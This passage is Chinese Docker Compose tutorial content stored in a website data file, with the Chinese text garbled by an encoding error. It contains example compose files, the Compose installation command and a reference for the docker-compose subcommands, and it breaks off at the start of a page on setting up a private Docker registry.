"CMD","curl","-f","http://localhost:80" ]\n      ### é´éæ¶é´\n      interval: 1m30s\n      ### è¶æ¶æ¶é´\n      timeout: 10s\n      ### éè¯æ¬¡æ°\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### ä¿®æ¹åæ ¸åæ°ï¼ä¹å¯ä»¥æ¯æ°ç»çæ¹å¼\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### æå®å®¹å¨ç ulimits éå¶å¼ï¼ä¾å¦ ï¼\n    ulimits:\n      ### æå®æå¤§è¿ç¨æ°ä¸º 65535\n      nproc: 65535\n      ### æå®æä»¶å¥ææ°ä¸º\n      nofile:\n        ### è½¯éå¶ 200000ï¼è½¯éå¶ï¼åºç¨å¯ä»¥éæ¶ä¿®æ¹ï¼ä¸è½è¶è¿ç¡¬éå¶ï¼\n        soft: 20000\n        ### ç¡¬éå¶ï¼ç³»ç»ç¡¬éå¶ï¼åªè½rootç¨æ·æé«ï¼\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/Dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# Compose æä»¤\n\nå¯¹äº Compose æ¥è¯´ï¼å¤§é¨åå½ä»¤çå¯¹è±¡æ¢å¯ä»¥æ¯é¡¹ç®æ¬èº«ï¼ä¹å¯ä»¥æå®ä¸ºé¡¹ç®ä¸­çæå¡æèå®¹å¨ãå¦ææ²¡æç¹å«çè¯´æï¼å½ä»¤å¯¹è±¡å°æ¯é¡¹ç®ï¼è¿æå³çé¡¹ç®ä¸­ææçæå¡é½ä¼åå°å½±åã\n\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n\n1\n\n\n\n# å½ä»¤éé¡¹\n\n * -f -> --file FILE æå®ä½¿ç¨ç Compose æ¨¡æ¿ææä»¶ï¼é»è®¤ä¸º docker-compose.ymlï¼å¯ä»¥å¤æ¬¡æå®ã\n * -p -> --project-name NAME æå®é¡¹ç®åç§°ï¼é»è®¤å°ä½¿ç¨æå¨ç®å½åç§°ä½ä¸ºé¡¹ç®å\n * --x-networking ä½¿ç¨ Docker å¯ææç½ç»åç«¯ç¹æ§\n * --verbose è¾åºæ´å¤è°è¯ä¿¡æ¯ã\n * -v -> --version æå°çæ¬å¹¶éåºã\n\n\n# å½ä»¤ä½¿ç¨è¯´æ\n\n# up\n\ndocker-compose up [options] [SERVICE...]\n\n\n1\n\n * è¯¥å½ä»¤ååå¼ºå¤§ï¼å®å°å°è¯èªå¨å®æåæ¬æå»ºéåï¼ï¼éæ°ï¼åå»ºæå¡ï¼å¯å¨æå¡ï¼å¹¶å³èæå¡ç¸å³å®¹å¨çä¸ç³»åæä½ã\n * è¿æ¥çæå¡é½å°ä¼è¢«èªå¨å¯å¨ï¼é¤éå·²ç»å¤äºè¿è¡ç¶æ\n * å¤§é¨åçæ¶åé½å¯ä»¥ç´æ¥éè¿è¯¥å½ä»¤æ¥å¯å¨ä¸ä¸ªé¡¹ç®ã\n * é»è®¤æåµï¼docker-compose up å¯å¨çå®¹å¨é½å¨åå°ï¼æ§å¶å°å°ä¼åæ¶æå°ææå®¹å¨çè¾åºä¿¡æ¯ï¼å¯ä»¥å¾æ¹ä¾¿è¿è¡è°è¯ã\n * å½éè¿ Ctrl-c åæ­¢å½ä»¤æ¶ï¼ææå®¹å¨å°ä¼åæ­¢\n * å¦æä½¿ç¨ docker-compose up -dï¼å°ä¼ååå°å¯å¨å¹¶è¿è¡ææçå®¹å¨ï¼ä¸è¬æ¨èçäº§ç¯å¢ä¸ä½¿ç¨è¯¥éé¡¹ã\n * é»è®¤æåµï¼å¦ææå¡å®¹å¨å·²ç»å­å¨ï¼docker-compose up å°ä¼å°è¯åæ­¢å®¹å¨ï¼ç¶åéæ°åå»ºï¼ä¿æä½¿ç¨ volumes-from æè½½çå·ï¼ï¼ä»¥ä¿è¯æ°å¯å¨çæå¡å¹é docker-compose.yml æä»¶çææ°åå®¹ã\n\n# down\n\ndocker-compose down\n\n\n1\n\n\næ­¤å½ä»¤å°ä¼åæ­¢ up å½ä»¤æå¯å¨çå®¹å¨ï¼å¹¶ç§»é¤ç½ç»\n\n# exec\n\ndocker-compose exec æå¡å\n\n\n1\n\n\nè¿å¥æå®çå®¹å¨\n\n# ps\n\ndocker-compose ps [options] [SERVICE...]\n\n\n1\n\n\nååºé¡¹ç®ä¸­ç®åçææå®¹å¨ã\n\n * -q ï¼å¯ä»¥ä»¥æå°å®¹å¨ç ID ä¿¡æ¯\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\néå¯é¡¹ç®ä¸­çæå¡ï¼éé¡¹ -t æå®éå¯ååæ­¢å®¹çè¶æ¶æ¶é´ï¼é»è®¤ 10sï¼\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\nå é¤ææï¼åæ­¢ç¶æçï¼æå¡å®¹å¨ãæ¨èåæ§è¡ docker-compose stop å½ä»¤æ¥åæ­¢å®¹å¨ã\n\n * -f å¼ºå¶ç´æ¥å é¤ï¼åæ¬éåæ­¢ç¶æçå®¹å¨ãä¸è¬å°½éä¸è¦ä½¿ç¨è¯¥éé¡¹ã\n * -v å é¤å®¹å¨ææè½½çæ°æ®å·ã\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\nå¯å¨å·²ç»å­å¨çæå¡å®¹å¨\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\nåæ­¢å·²ç»å¤äºè¿è¡ç¶æçå®¹å¨ï¼ä½ä¸å é¤å®ãéè¿ docker-compose start å¯ä»¥åæ¬¡å¯å¨è¿äºå®¹å¨\n\n * -t åæ­¢å®¹å¨çè¶æ¶æ¶é´ï¼é»è®¤ä¸º 10sï¼\n\n# top\n\ndocker-compose top\n\n\n1\n\n\næ¥çåä¸ªæå¡å®¹å¨åè¿è¡çè¿ç¨ã\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\næåå¤äºè¿è¡ä¸­çæå¡ã\n\ndocker-compose unpause [service...]\n\n\n1\n\n\næ¢å¤å¤äºæåç¶æä¸­çæå¡ã\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\næ¥çæä¸ªæå¡çæ¥å¿',normalizedContent:'# ç®ä»\n\ncompose é¡¹ç®æ¯ docker å®æ¹çå¼æºé¡¹ç®ï¼è´è´£å®ç°å¯¹ docker å®¹å¨éç¾¤çå¿«éç¼æï¼å¸®å©å®ä¹åè¿è¡å¤ä¸ª docker å®¹å¨çåºç¨ï¼å¶åèº«æ¯å¼æºé¡¹ç® figãæè°ç¼æå°±æ¯è½æä¸ä¸ªé¡¹ç®çä¾èµï¼å¦ mysqlï¼redisï¼æå¡é´çä¾èµç­ï¼æç§æåºçæ¹å¼å¯å¨å®¹å¨\n\ndockerfile å¯ä»¥è®©ç¨æ·å¾æ¹ä¾¿çå®ä¹ä¸ä¸ªåç¬çåºç¨å®¹å¨ï¼ç¶èå¨æ¥å¸¸å·¥ä½ä¸­ä»¬ç»å¸¸ä¼ç¢°å°éè¦å¤ä¸ªå®¹å¨ç¸äºéåæ¥å®ææé¡¹ä»»å¡çæåµãä¾å¦è¦å®ç°ä¸ä¸ª web é¡¹ç®ï¼é¤äº web æå¡å®¹å¨æ¬èº«ï¼å¾å¾è¿éè¦åå ä¸åç«¯çæ°æ®åºæå¡å¨å®¹å¨ï¼çè³è¿åæ¬è´è½½åè¡¡å®¹å¨ç­ã\n\ncompose æ°å¥½æ»¡è¶³äºè¿æ ·çéæ±ï¼å®åè®¸éè¿ä¸ä¸ªåç¬ç docker-compose.yml æ¨¡æ¿æä»¶ï¼æ¥å®ä¹ä¸ç»ç¸å³èçåºç¨å®¹å¨ä¸ºä¸ä¸ªé¡¹ç®ã\n\ncompose ä¸­æä¸¤ä¸ªéè¦çæ¦å¿µ\n\n 1. æå¡ï¼serviceï¼ï¼ä¸ä¸ªåºç¨çå®¹å¨ï¼å®éä¸å¯ä»¥åæ¬è¥å¹²è¿è¡ç¸åéåçå®¹å¨å®ä¾ã\n 2. é¡¹ç®ï¼projectï¼ï¼ç±ä¸ç»å³èçåºç¨å®¹å¨ç»æçä¸ä¸ªå®æ´ä¸å¡ååï¼å docker-compose.yml æä»¶ä¸­å®ä¹ã\n\ncompose çé»è®¤ç®¡çå¯¹è±¡æ¯é¡¹ç®ï¼éè¿å­å½ä»¤å¯¹é¡¹ç®ä¸­çä¸ç»å®¹å¨è¿è¡ä¾¿æ·å°çå½å¨æç®¡çã\n\ncompose é¡¹ç®ç± python ç¼åï¼å®ç°ä¸è°ç¨äº docker æå¡æä¾ç api æ¥å¯¹å®¹å¨è¿è¡ç®¡çãå æ­¤ï¼åªè¦ææä½çå¹³å°æ¯æ docker apiï¼å°±å¯ä»¥åå¶ä¸å©ç¨ compose æ¥è¿è¡ç¼æç®¡çã\n\n\n# å®è£ä¸å¸è½½\n\nå®è£çè¯ï¼å¯ä»¥å®è£ docker desktop ï¼å®åå«äº docker ä»¥å compose å k8sï¼ä¹å¯ä»¥åç¬å®è£ï¼ä½å»ºè®®åäºè§£æ¸æ¥å®æ¹å¯¹ compose çä¸äºå®è£éå¶ãå®æ¹å°å\n\nlinux å®è£\n\nsudo curl -l "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# å½ä»¤\n\nå½ä»¤            æè¿°\nversion       çæ¬ç®å 4 ä»¥ä¸çé½å¯ä»¥åï¼å¦ 3.9ï¼3.8 ç­ï¼æå¥½ä¿æå docker çæ¬å¼å®¹\nservices      å¯ä»¥éé¢æè¿°ä½ çæææå¡ï¼ä»¥åä¾èµå³ç³»ç­\nimage         æå®ä¸ºéååç§°æéå idï¼å¦æéåå¨æ¬å°ä¸å­å¨ï¼compose å°ä¼å°è¯æåè¿ä¸ªéå\nports         æå®ä¸å®¿ä¸»æºä¸å®¹å¨æ å°çç«¯å£ï¼æ¯ä¸ä¸ªæ°ç»ï¼æ¯ä¸ªæ°ç»çåç´ å»ºè®®ç¨å­ç¬¦å½¢å¼ï¼å¦ "80:80"\nvolumes       æè½½è·¯å¾è®¾ç½®ï¼ç±»åä¸ºæ°ç»ï¼å¯ä»¥æè½½å¤ä¸ªï¼å¨å¶ä½å®¹å¨çæ¶åå¯ä»¥æ¾ç¤ºçå£°ææè½½è·¯å¾ï¼ä¹å¯ä»¥å¨å®¹å¨è¿è¡æ¶ç´æ¥ä½¿ç¨ -v å½ä»¤ã\nnetworks      éç½®å®¹å¨è¿æ¥çç½ç» docker network ls æ¥çç½ç»åè¡¨ï¼ docker network inspect\n              <container id> å¯ä»¥æ¥çå¯¹åºç½ç»çéç½®\nenvironment   è®¾ç½®ç¯å¢åéãä½ å¯ä»¥ä½¿ç¨æ°ç»æå­å¸ä¸¤ç§æ¹å¼\nenv_file      ä»æä»¶ä¸­è·åç¯å¢åéï¼å¯ä»¥ä¸ºåç¬çæä»¶è·¯å¾æåè¡¨ï¼æä»¶åå¿é¡»æ¯å­å¸æ¹å¼ç¼å\ncommand       è¦çå®¹å¨å¯å¨åé»è®¤æ§è¡çå½ä»¤\ndepends_on    è§£å³å®¹å¨çä¾èµãå¯å¨ååçé®é¢ï¼å¡«åçå¼ä¸º æå¡åï¼ä¼ç­ä¾èµçæå¡å¯å¨ä¸å®ç¨åº¦æå¯å¨èªå·±\nhealthcheck   éè¿å½ä»¤æ£æ¥å®¹å¨æ¯å¦çæ§è¿è¡\nsysctls       éç½®å®¹å¨åæ ¸åæ°ï¼å¦ es ç­é½éè¦ä¿®æ¹åæ ¸çç¯å¢åæ°\nulimits       æå®å®¹å¨ç ulimits éå¶å¼ï¼å¦ esãclickhouse ä¼æä¿®æ¹éæ±\nbuild         ç¨æ¥å°æå® dockerfile æåæå¯¹åºéåï¼ç¶ååè¿è¡è¯¥éå\n\nè¿äºå½ä»¤å¶å®å°±ç±»ä¼¼äºæä»¬å¨ docker ä¸­å¯å¨ä¸ä¸ªå®¹å¨çå½ä»¤ã\n\n\n# compose æä»¶ç¼å\n\n\n# ç¤ºä¾ 1\n\n### çæ¬\nversion: "3.2"\n\nservices:\n  ### æå¡åç§°\n  tomcat:\n    ### æå®å®¹å¨çåç§° ç¸å½äº --name\n    container_name: tomcat_1\n    ### ä½¿ç¨åªä¸ªéå ç¸å½äº docket run image\n    image: tomcat:8.0-jre8\n    ### æå®å®¿ä¸»æºä¸å®¹å¨ç«¯å£çæ å° ç¸å½äº -p\n    ports:\n      ### å®¿ä¸»æº:å®¹å¨\n      - "8080:8080"\n    ### å®¿ä¸»æºä¸å®¹å¨çæ°æ®å±äº« æè½½ç®å½ ç¸å½äº -v\n    volumes:\n      ### æ¹å¼1ï¼æå®ç»å¯¹æç¡®(ç»å¯¹è·¯å¾)çæè½½ç®å½\n      - /home/server:/user\n      ### æ¹å¼2ï¼å£°æäºèªå®åå»ºå·åçåé\n      - tomcatwebapps:/user\n    ### ä»£è¡¨å½åæå¡å¤äºé£ä¸ªç½ç»ï¼ä½ç¨æ¯ç½ç»éç¦»ç¨ï¼ä¼æç¸ç½ç»åç§°ç¸åçå®¹å¨çç½æ®µç»ä¸ãç¸å½äº --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -mysql_root_password=root\n    networks:\n      group1\n\n\n### æè¿° æå¨å·éçåé\nvolumes:\n  ### æå®åé tomcatwebappsï¼å¦æä¸å externalï¼é»è®¤ä¼æ¯ docker-compose.yml æå¨å½åæä»¶å¤¹çåç§°(ä¼èªå¨åå»º)\n  tomcatwebapps:\n    ### ä½¿ç¨èªå®ä¹å·æ¯\n    external:\n      ### true ç¡®å®ä½¿ç¨æå®å·åï¼æ³¨æï¼ä¸æ¦ä½¿ç¨å¤é¨èªå®ä¹å·åï¼å¯å¨æå¡ä¹åå¿é¡»æå¨åå»º docker volume create å·å\n      false\n  mysqldata:\n  mysqlconf:\n\n### å®ä¹æå¡ç¨å°çç½ç»\nnetworks:\n  ### å®ä¹ä¸é¢çæå¡ç¨å°çç½ç»çåç§°ï¼é»è®¤æ¯é©±å¨å±äº bridgeï¼èªå®ä¹çç½ç»åç§° group1ï¼å¨å®éä¸­ä¼åä¸º é¡¹ç®å(ææå¨æä»¶ç®å½å)\n  group1:\n    ### ä½¿ç¨å¤é¨æå®çç½ç»ï¼ä¸º true å°±æ è¯ç½ç»å¿é¡»å­å¨\n    external:\n      ### docker network create -d bridge ç½ç»åç§°\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# ç¤ºä¾ 2\n\n### æå®çæ¬ï¼çæ¬çå³ç³»ådocker å¼ææå³\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles çæ¬å³ç³»åè¯´æ\nversion: \'3.7\'\n\n### æå®æå¡\nservices:\n  ### æå¡åç§° å¯ä¸\n  monitor-web-server-service:\n    ### æå»ºéåçé¡¹ç®è·¯å¾\n    build:\n      ### æå®ä¸ä¸æè·¯å¾ï¼é»è®¤æ¯å¾®æå¡é¡¹ç®çæ ¹ç®å½\n      context: ./monitor-web/monitor-web-server/\n      ### æå®\n      dockerfile: monitor-web-server-service\n    ### æå®éååç§°\n    image: monitor-web-server-service\n    ### .envçç¯å¢åé\n    env_file:\n      - ./.env\n    ### ç½ç»éç½®\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### è®¾ç½®åé¨åå¤é¨ç«¯å£\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### å¿è·³æ£æ¥\n    healthcheck:\n      ### è®¿é® monitor-gateway ç½å³çå½ä»¤\n      test: [ "cmd","curl","-f","http://localhost:80" ]\n      ### é´éæ¶é´\n      interval: 1m30s\n      ### è¶æ¶æ¶é´\n      timeout: 10s\n      ### éè¯æ¬¡æ°\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### ä¿®æ¹åæ ¸åæ°ï¼ä¹å¯ä»¥æ¯æ°ç»çæ¹å¼\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### æå®å®¹å¨ç ulimits éå¶å¼ï¼ä¾å¦ ï¼\n    ulimits:\n      ### æå®æå¤§è¿ç¨æ°ä¸º 65535\n      nproc: 65535\n      ### æå®æä»¶å¥ææ°ä¸º\n      nofile:\n        ### è½¯éå¶ 200000ï¼è½¯éå¶ï¼åºç¨å¯ä»¥éæ¶ä¿®æ¹ï¼ä¸è½è¶è¿ç¡¬éå¶ï¼\n        soft: 20000\n        ### ç¡¬éå¶ï¼ç³»ç»ç¡¬éå¶ï¼åªè½rootç¨æ·æé«ï¼\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# compose æä»¤\n\nå¯¹äº compose æ¥è¯´ï¼å¤§é¨åå½ä»¤çå¯¹è±¡æ¢å¯ä»¥æ¯é¡¹ç®æ¬èº«ï¼ä¹å¯ä»¥æå®ä¸ºé¡¹ç®ä¸­çæå¡æèå®¹å¨ãå¦ææ²¡æç¹å«çè¯´æï¼å½ä»¤å¯¹è±¡å°æ¯é¡¹ç®ï¼è¿æå³çé¡¹ç®ä¸­ææçæå¡é½ä¼åå°å½±åã\n\ndocker-compose [-f=<arg>...] [options] [command] [args...]\n\n\n1\n\n\n\n# å½ä»¤éé¡¹\n\n * -f -> --file file æå®ä½¿ç¨ç compose æ¨¡æ¿ææä»¶ï¼é»è®¤ä¸º docker-compose.ymlï¼å¯ä»¥å¤æ¬¡æå®ã\n * -p -> --project-name name æå®é¡¹ç®åç§°ï¼é»è®¤å°ä½¿ç¨æå¨ç®å½åç§°ä½ä¸ºé¡¹ç®å\n * --x-networking ä½¿ç¨ docker å¯ææç½ç»åç«¯ç¹æ§\n * --verbose è¾åºæ´å¤è°è¯ä¿¡æ¯ã\n * -v -> --version æå°çæ¬å¹¶éåºã\n\n\n# å½ä»¤ä½¿ç¨è¯´æ\n\n# up\n\ndocker-compose up [options] [service...]\n\n\n1\n\n * è¯¥å½ä»¤ååå¼ºå¤§ï¼å®å°å°è¯èªå¨å®æåæ¬æå»ºéåï¼ï¼éæ°ï¼åå»ºæå¡ï¼å¯å¨æå¡ï¼å¹¶å³èæå¡ç¸å³å®¹å¨çä¸ç³»åæä½ã\n * è¿æ¥çæå¡é½å°ä¼è¢«èªå¨å¯å¨ï¼é¤éå·²ç»å¤äºè¿è¡ç¶æ\n * å¤§é¨åçæ¶åé½å¯ä»¥ç´æ¥éè¿è¯¥å½ä»¤æ¥å¯å¨ä¸ä¸ªé¡¹ç®ã\n * é»è®¤æåµï¼docker-compose up å¯å¨çå®¹å¨é½å¨åå°ï¼æ§å¶å°å°ä¼åæ¶æå°ææå®¹å¨çè¾åºä¿¡æ¯ï¼å¯ä»¥å¾æ¹ä¾¿è¿è¡è°è¯ã\n * å½éè¿ ctrl-c åæ­¢å½ä»¤æ¶ï¼ææå®¹å¨å°ä¼åæ­¢\n * å¦æä½¿ç¨ docker-compose up -dï¼å°ä¼ååå°å¯å¨å¹¶è¿è¡ææçå®¹å¨ï¼ä¸è¬æ¨èçäº§ç¯å¢ä¸ä½¿ç¨è¯¥éé¡¹ã\n * é»è®¤æåµï¼å¦ææå¡å®¹å¨å·²ç»å­å¨ï¼docker-compose up å°ä¼å°è¯åæ­¢å®¹å¨ï¼ç¶åéæ°åå»ºï¼ä¿æä½¿ç¨ volumes-from æè½½çå·ï¼ï¼ä»¥ä¿è¯æ°å¯å¨çæå¡å¹é docker-compose.yml æä»¶çææ°åå®¹ã\n\n# down\n\ndocker-compose down\n\n\n1\n\n\næ­¤å½ä»¤å°ä¼åæ­¢ up å½ä»¤æå¯å¨çå®¹å¨ï¼å¹¶ç§»é¤ç½ç»\n\n# exec\n\ndocker-compose exec æå¡å\n\n\n1\n\n\nè¿å¥æå®çå®¹å¨\n\n# ps\n\ndocker-compose ps [options] [service...]\n\n\n1\n\n\nååºé¡¹ç®ä¸­ç®åçææå®¹å¨ã\n\n * -q ï¼å¯ä»¥ä»¥æå°å®¹å¨ç id ä¿¡æ¯\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\néå¯é¡¹ç®ä¸­çæå¡ï¼éé¡¹ -t æå®éå¯ååæ­¢å®¹çè¶æ¶æ¶é´ï¼é»è®¤ 10sï¼\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\nå é¤ææï¼åæ­¢ç¶æçï¼æå¡å®¹å¨ãæ¨èåæ§è¡ docker-compose stop å½ä»¤æ¥åæ­¢å®¹å¨ã\n\n * -f å¼ºå¶ç´æ¥å é¤ï¼åæ¬éåæ­¢ç¶æçå®¹å¨ãä¸è¬å°½éä¸è¦ä½¿ç¨è¯¥éé¡¹ã\n * -v å é¤å®¹å¨ææè½½çæ°æ®å·ã\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\nå¯å¨å·²ç»å­å¨çæå¡å®¹å¨\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\nåæ­¢å·²ç»å¤äºè¿è¡ç¶æçå®¹å¨ï¼ä½ä¸å é¤å®ãéè¿ docker-compose start å¯ä»¥åæ¬¡å¯å¨è¿äºå®¹å¨\n\n * -t åæ­¢å®¹å¨çè¶æ¶æ¶é´ï¼é»è®¤ä¸º 10sï¼\n\n# top\n\ndocker-compose top\n\n\n1\n\n\næ¥çåä¸ªæå¡å®¹å¨åè¿è¡çè¿ç¨ã\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\næåå¤äºè¿è¡ä¸­çæå¡ã\n\ndocker-compose unpause [service...]\n\n\n1\n\n\næ¢å¤å¤äºæåç¶æä¸­çæå¡ã\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\næ¥çæä¸ªæå¡çæ¥å¿',charsets:{cjk:!0}},{title:"Dockerç§æåºçå¼å",frontmatter:{title:"Dockerç§æåºçå¼å",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/402",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/40.Docker/402.Docker%E7%A7%81%E6%9C%89%E5%BA%93%E7%9A%84%E5%BC%80%E5%8F%91.html",relativePath:"01.è¿ç»´/40.Docker/402.Dockerç§æåºçå¼å.md",key:"v-6ee475a8",path:"/docker/402/",headers:[{level:2,title:"åå¤",slug:"åå¤",normalizedTitle:"åå¤",charIndex:721},{level:3,title:"config.yml",slug:"config-yml",normalizedTitle:"config.yml",charIndex:1001},{level:2,title:"ä½¿ç¨ Docker Registry",slug:"ä½¿ç¨-docker-registry",normalizedTitle:"ä½¿ç¨ docker registry",charIndex:6398},{level:2,title:"è®¿é® Registry API",slug:"è®¿é®-registry-api",normalizedTitle:"è®¿é® registry api",charIndex:6773}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"åå¤ config.yml ä½¿ç¨ Docker Registry è®¿é® Registry API",content:'æ­£å¸¸æ¥è¯´æä»¬ä½¿ç¨å«äººçç§æåºå°±è¶³å¤äºï¼æ¯å¦ä½¿ç¨ Harborï¼å®å¯ä»¥å¸®æä»¬å¾å¥½çç®¡ç dockerï¼ä»¥åé¨ç½²ä¸ºç§ææå¬æåºç»ä¼ä¸æå¶ä»äººä½¿ç¨ï¼å¦ææ³å¼åä¸å¥é£ä¹éè¦äºè§£ docker ç¸å³ç APIï¼å¶ä¸­ dockerAPI åä¸ºå¦ä¸ä¸é¨åï¼\n\n * Docker Engine APIï¼Docker Engine API æ¯ Docker å¼æç API æ¥å£ï¼ç¨äºä¸ Docker å¼æè¿è¡éä¿¡åç®¡çãéè¿ Docker Engine APIï¼å¯ä»¥ç®¡çå®¹å¨ãéåãç½ç»ãå·ç­ Docker ç¸å³èµæºãå¯ä»¥ä½¿ç¨ Docker Engine API åå»ºãå¯å¨ãåæ­¢åå é¤å®¹å¨ï¼æå»ºåæ¨ééåï¼ä»¥åè¿è¡å®¹å¨åéåçç®¡çåçæ§ã\n * Docker Hub APIï¼Docker Hub API æ¯ä¸ Docker Hub äº¤äºç API æ¥å£ãDocker Hub æ¯ä¸ä¸ªå¬å±ç Docker éåä»åºï¼ç¨äºå­å¨ååäº« Docker éåãDocker Hub API åè®¸ç¨æ·éè¿ API æ¥å£ä¸ Docker Hub è¿è¡äº¤äºï¼å¯ä»¥æç´¢ãä¸è½½ãä¸ä¼ åå é¤éåï¼ç®¡çä»åºãæ ç­¾åç»ç»ç­\n * Registry APIï¼Registry API æ¯ä¸ Docker Registry è¿è¡äº¤äºç API æ¥å£ãDocker Registry æ¯ä¸ä¸ªç§æç Docker éåä»åºï¼å¯ä»¥èªå·±æ­å»ºåç®¡çãRegistry API åè®¸ç¨æ·éè¿ API æ¥å£ä¸ç§æç Docker Registry è¿è¡äº¤äºï¼å¯ä»¥ä¸ä¼ ãä¸è½½åå é¤éåï¼ç®¡çä»åºåæ ç­¾ç­\n\næ²¡éï¼å¦æéè¦å»ºç«èªå·±ç docker ç§æåºå°±è¦ç¨å° Registry APIã\n\n\n# åå¤\n\nè¦å¨æ¬å°æ­å»ºç§æç Docker Registryï¼æ¨å¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡æä½ï¼\n\n 1. ç¡®ä¿å·²ç»å®è£ Dockerï¼è¥è¿æ²¡æï¼æ¨å¯ä»¥ä» Docker å®æ¹ç½ç«ï¼https://www.docker.com/ï¼ä¸è½½å¹¶å®è£éç¨äºæ¨çæä½ç³»ç»ç Docker çæ¬ã\n 2. éç½® Docker Registryï¼æ¥ä¸æ¥ï¼æ¨éè¦åå»ºå¹¶éç½® Docker Registryãå¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡éç½®ï¼\n    * åå»ºä¸ä¸ªå­å¨ Registry æ°æ®çç®å½ãä¾å¦ï¼æ¨å¯ä»¥åå»ºä¸ä¸ªåä¸º /var/lib/registry çç®å½ã\n    * åå»ºä¸ä¸ªåä¸º config.yml çéç½®æä»¶ï¼å¹¶å¨å¶ä¸­æå® Registry çéç½®éé¡¹ãä¾å¦ï¼æ¨å¯ä»¥æå® Registry çå¬å¨ 5000 ç«¯å£ä¸ï¼å¹¶åè®¸å¿åè®¿é®ãï¼å·ä½è§ä¸é¢ config éç½®è®²è§£ï¼\n 3. ä¸º Docker Registry API æåéç½®\n    åè¿è¡éç½®ï¼å» /etc/docker/daemon.json æ·»å 